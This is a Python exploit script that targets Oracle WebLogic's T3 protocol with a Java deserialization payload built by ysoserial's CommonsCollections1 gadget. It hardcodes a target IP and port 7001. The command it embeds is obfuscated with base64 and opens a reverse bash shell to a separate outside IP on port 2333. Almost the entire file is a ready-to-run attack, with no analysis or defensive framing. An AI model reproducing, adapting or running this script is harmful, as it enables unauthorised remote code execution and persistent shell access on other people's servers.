from os import popen
import struct # 负责大小端的转换 
import subprocess
from sys import stdout
import socket
import re
import binascii

def generatePayload(gadget,cmd):
    YSO_PATH = "D:/Bag_Install/ysoserial.jar"
    popen = subprocess.Popen(['java','-jar',YSO_PATH,gadget,cmd],stdout=subprocess.PIPE)
    return popen.stdout.read()

def T3Exploit(ip,port,payload):
    sock =socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    sock.connect((ip,port))
    handshake = "t3 12.2.3\nAS:255\nHL:19\nMS:10000000\n\n"
    sock.sendall(handshake.encode())
    data = sock.recv(1024)
    compile = re.compile("HELO:(.*).0.false")
    match = compile.findall(data.decode())
    if match:
        print("Weblogic: "+"".join(match))
    else:
        print("Not Weblogic")
        # return  
    header = binascii.a2b_hex(b"00000000")
    t3header = binascii.a2b_hex(b"016501ffffffffffffffff000000690000ea60000000184e1cac5d00dbae7b5fb5f04d7a1678d3b7d14d11bf136d67027973720078720178720278700000000a000000030000000000000006007070707070700000000a000000030000000000000006007006")
    desflag = binascii.a2b_hex(b"fe010000")
    payload = header + t3header  +desflag+  payload
    payload = struct.pack(">I",len(payload)) + payload[4:]
    sock.send(payload)
if __name__ == "__main__":
    ip = "81.68.120.14"
    port = 7001
    gadget = "CommonsCollections1"
    cmd = "bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xMjQuMjIyLjIxLjEzOC8yMzMzIDA+JjE=}|{base64,-d}|{bash,-i}"
    payload = generatePayload(gadget,cmd)
    T3Exploit(ip,port,payload)